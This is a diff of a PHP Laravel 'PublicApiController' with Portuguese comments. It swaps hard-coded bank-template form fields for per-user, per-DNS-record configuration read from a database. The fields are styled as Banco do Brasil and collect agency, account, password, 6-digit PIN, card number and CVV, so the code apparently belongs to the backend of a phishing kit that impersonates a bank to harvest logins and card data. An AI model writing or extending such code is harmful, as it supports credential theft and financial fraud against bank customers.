@@ -336,108 +336,88 @@ class PublicApiController extends Controller
                 
                 // 1. Primeiro buscamos a configuração personalizada na tabela template_user_configs
                 // que contém as configurações de quais campos estão ativos e sua ordem
-                // Simplificar o código para demonstrar o formato correto da API
-                if ($bankTemplate) {
-                    Log::info('API Pública - Usando dados de exemplo para template ' . $bankTemplate->name);
+                $templateUserConfig = DB::table('template_user_configs')
+                    ->where('user_id', $usuario->id)
+                    ->where('template_id', $bankTemplate->id)
+                    ->where('record_id', $dnsRecord->id)
+                    ->first();
+                
+                Log::info('API Pública - Buscando template_user_configs para: user_id=' . $usuario->id . 
+                        ', template_id=' . $bankTemplate->id . ', record_id=' . $dnsRecord->id);
+                
+                // Inicializar arrays
+                $camposConfig = [];
+                $camposOrder = [];
+                
+                // Verificar se estamos usando a tabela correta (template_user_configs)
+                // Debug para verificar se a tabela existe
+                try {
+                    $checkTable = DB::select("SHOW TABLES LIKE 'template_user_configs'");
+                    Log::info('API Pública - Verificando tabela: ' . json_encode($checkTable));
+                } catch (\Exception $e) {
+                    Log::error('API Pública - Erro ao verificar tabela: ' . $e->getMessage());
+                }
+                
+                // Exibir todos os registros da tabela para debug
+                try {
+                    $allConfigs = DB::table('template_user_configs')->get();
+                    Log::info('API Pública - Total de registros na tabela: ' . $allConfigs->count());
+                    foreach($allConfigs as $config) {
+                        Log::info("API Pública - Config ID {$config->id}: user_id={$config->user_id}, template_id={$config->template_id}, record_id={$config->record_id}");
+                    }
+                } catch (\Exception $e) {
+                    Log::error('API Pública - Erro ao listar registros: ' . $e->getMessage());
+                }
+                
+                // Agora buscar a configuração específica deste usuário
+                $templateUserConfig = DB::table('template_user_configs')
+                    ->where('user_id', $usuario->id)
+                    ->where('template_id', $bankTemplate->id);
                     
-                    // Dados básicos do template
-                    $templateData = [
-                        'id' => $bankTemplate->id,
-                        'name' => $bankTemplate->name,
-                        'bank_code' => $bankTemplate->bank_code,
-                        'logo_url' => null,
-                        'colors' => [
-                            'primary' => '#0066b3',  // Azul Banco do Brasil
-                            'secondary' => '#ffef38',  // Amarelo Banco do Brasil
-                            'accent' => '#ffffff'
-                        ],
-                        'is_default' => true
-                    ];
+                // Adicionamos a condição de record_id apenas se tivermos um dnsRecord
+                if ($dnsRecord) {
+                    $templateUserConfig->where('record_id', $dnsRecord->id);
+                }
+                
+                $templateUserConfig = $templateUserConfig->first();
+                
+                Log::info('API Pública - Buscando config em template_user_configs: user_id=' . $usuario->id . 
+                        ', template_id=' . $bankTemplate->id . 
+                        ($dnsRecord ? ', record_id=' . $dnsRecord->id : ', sem record_id'));
+                
+                if ($templateUserConfig && !empty($templateUserConfig->config)) {
+                    Log::info('API Pública - Config encontrada: ' . $templateUserConfig->config);
                     
-                    // EXEMPLO: Configurações baseadas no formato mostrado pelo usuário
-                    // {"agencia":{"active":true,"order":1},"conta":{"active":true,"order":2},...}
-                    $camposConfig = [
-                        'agencia' => [
-                            'name' => 'Agência',
-                            'key' => 'agencia',
-                            'type' => 'text',
-                            'visible' => true,
-                            'required' => true,
-                            'order' => 1,
-                            'placeholder' => 'Digite sua agência'
-                        ],
-                        'conta' => [
-                            'name' => 'Conta',
-                            'key' => 'conta',
-                            'type' => 'text',
-                            'visible' => true,
-                            'required' => true,
-                            'order' => 2,
-                            'placeholder' => 'Digite sua conta'
-                        ],
-                        'senha' => [
-                            'name' => 'Senha',
-                            'key' => 'senha',
-                            'type' => 'password',
-                            'visible' => true,
-                            'required' => true,
-                            'order' => 3,
-                            'placeholder' => 'Digite sua senha'
-                        ],
-                        'observacoes' => [
-                            'name' => 'Observações',
-                            'key' => 'observacoes',
-                            'type' => 'textarea',
-                            'visible' => true,
-                            'required' => false,
-                            'order' => 4,
-                            'placeholder' => 'Informações adicionais (opcional)'
-                        ],
-                        'senha6' => [
-                            'name' => 'Senha de 6 dígitos',
-                            'key' => 'senha6',
-                            'type' => 'password',
-                            'visible' => true,
-                            'required' => true,
-                            'order' => 5,
-                            'placeholder' => 'Digite sua senha de 6 dígitos'
-                        ],
-                        'cartao' => [
-                            'name' => 'Cartão',
-                            'key' => 'cartao',
-                            'type' => 'text',
-                            'visible' => false,  // Campo desativado conforme exemplo
-                            'required' => false,
-                            'order' => 6,
-                            'placeholder' => 'Número do cartão'
-                        ],
-                        'cvv' => [
-                            'name' => 'CVV',
-                            'key' => 'cvv',
-                            'type' => 'text',
-                            'visible' => true,
-                            'required' => false,
-                            'order' => 7,
-                            'placeholder' => 'Código de segurança'
-                        ],
-                        'card_data' => [
-                            'name' => 'Dados do Cartão',
-                            'key' => 'card_data',
-                            'type' => 'text',
-                            'visible' => true,
-                            'required' => false,
-                            'order' => 8,
-                            'placeholder' => 'Dados adicionais'
-                        ]
-                    ];
+                    // A configuração do usuário existe, vamos decodificar o JSON
+                    $userConfigData = json_decode($templateUserConfig->config, true);
                     
-                    // Ordem dos campos conforme configuração
-                    $camposOrder = ['agencia', 'conta', 'senha', 'observacoes', 'senha6', 'cvv', 'card_data'];
-                    
-                    // Log para debug
-                    Log::info('API Pública - Usando campos de exemplo: ' . json_encode(array_keys($camposConfig)));
-                    
-                    Log::info('API Pública - Total de campos finais com configurações combinadas: ' . count($camposConfig));
+                    if (json_last_error() !== JSON_ERROR_NONE) {
+                        Log::error('API Pública - Erro ao decodificar JSON: ' . json_last_error_msg());
+                    } else {
+                        Log::info('API Pública - Configuração decodificada: ' . json_encode($userConfigData));
+                        
+                        // Processar cada campo da configuração do usuário
+                        foreach ($userConfigData as $fieldKey => $fieldConfig) {
+                            // Preparar estrutura básica para cada campo
+                            $camposConfig[$fieldKey] = [
+                                'name' => ucfirst($fieldKey),  // Nome capitalizado da chave
+                                'key' => $fieldKey,
+                                'type' => 'text',              // Tipo padrão
+                                'visible' => $fieldConfig['active'] ?? true,
+                                'order' => $fieldConfig['order'] ?? 999
+                            ];
+                            
+                            // Se o campo está ativo, adicionar à ordem
+                            if (isset($fieldConfig['active']) && $fieldConfig['active'] === true) {
+                                $camposOrder[] = $fieldKey;
+                            }
+                        }
+                    }
+                } else {
+                    Log::warning('API Pública - Nenhuma configuração encontrada na tabela template_user_configs');
+                }
+                
+                Log::info('API Pública - Total de campos finais com configurações combinadas: ' . count($camposConfig));
                 
                 // Aplicar configurações personalizadas do usuário se existirem
                 if ($userCustomConfig && isset($userCustomConfig['campos']) && is_array($userCustomConfig['campos'])) {
